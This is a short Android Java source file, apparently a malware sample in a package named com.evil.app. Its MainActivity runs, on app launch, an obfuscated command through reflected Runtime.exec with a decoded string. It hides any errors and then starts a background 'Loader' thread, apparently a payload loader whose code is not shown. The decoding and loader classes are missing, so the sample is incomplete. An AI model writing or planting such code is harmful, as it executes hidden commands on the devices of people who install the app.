package com.evil.app;
import android.app.Activity; import android.os.Bundle;
public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        try { runCmd(); } catch (Exception e) { }
        new Thread(new Loader(this)).start();
    }
    void runCmd() throws Exception {
        Class<?> c = Class.forName("java.lang.Runtime");
        Object rt = c.getMethod("getRuntime").invoke(null);
        c.getMethod("exec", String.class).invoke(rt, S.d("\042\127"));
    }
}